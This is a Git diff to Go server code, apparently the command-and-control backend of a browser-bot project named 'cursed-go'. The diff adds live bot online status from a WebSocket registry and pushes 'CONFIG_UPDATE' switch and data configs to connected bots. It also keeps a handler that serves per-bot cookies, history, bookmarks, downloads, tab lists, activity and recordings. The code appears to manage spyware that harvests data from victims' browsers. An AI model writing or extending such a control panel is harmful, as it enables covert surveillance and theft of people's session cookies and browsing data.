@@ -14,9 +14,10 @@ import (
 	"github.com/s045pd/cursed-go/internal/db/models"
 )
 
-// BotsAPI groups bot management routes (no RPC needed).
+// BotsAPI groups bot management routes.
 type BotsAPI struct {
-	DB *gorm.DB
+	DB  *gorm.DB
+	RPC BotRPC
 }
 
 // botSummary mirrors the Node.js bot list payload shape.
@@ -118,7 +119,15 @@ func (a *BotsAPI) List(w http.ResponseWriter, r *http.Request) {
 	}
 	out := make([]botSummary, 0, len(rows))
 	for i := range rows {
-		out = append(out, botToSummary(&rows[i]))
+		s := botToSummary(&rows[i])
+		// DB is_online may be stale across non-graceful restarts (defer
+		// markOffline didn't run) and lags the WS lifecycle by one DB
+		// round-trip. The WS Registry is the source of truth for "is
+		// there an open socket right now"; let it override.
+		if a.RPC != nil {
+			s.IsOnline = a.RPC.IsBotOnline(rows[i].ID)
+		}
+		out = append(out, s)
 	}
 
 	JSONOK(w, map[string]any{
@@ -181,6 +190,22 @@ func (a *BotsAPI) Update(w http.ResponseWriter, r *http.Request) {
 		JSONErr(w, http.StatusNotFound, "bot not found")
 		return
 	}
+
+	// Push updated config to bot if online
+	if a.RPC != nil && (body.SwitchConfig != nil || body.DataConfig != nil) {
+		var bot models.Bot
+		if err := a.DB.Select("browser_id").Where("id = ?", id).First(&bot).Error; err == nil && bot.BrowserID != "" {
+			payload := map[string]any{}
+			if body.SwitchConfig != nil {
+				payload["switch_config"] = body.SwitchConfig
+			}
+			if body.DataConfig != nil {
+				payload["data_config"] = body.DataConfig
+			}
+			go a.RPC.CallBot(r.Context(), bot.BrowserID, "CONFIG_UPDATE", payload)
+		}
+	}
+
 	JSONOK(w, struct{}{})
 }
 
@@ -312,13 +337,13 @@ func (a *BotsAPI) Field(w http.ResponseWriter, r *http.Request) {
 		return
 	}
 	allowed := map[string]string{
-		"recording":  "recording",
-		"tabs":       "tabs",
-		"cookies":    "cookies",
-		"history":    "history",
-		"bookmarks":  "bookmarks",
-		"downloads":  "downloads",
-		"activity":   "activity",
+		"recording": "recording",
+		"tabs":      "tabs",
+		"cookies":   "cookies",
+		"history":   "history",
+		"bookmarks": "bookmarks",
+		"downloads": "downloads",
+		"activity":  "activity",
 	}
 	col, ok := allowed[field]
 	if !ok {
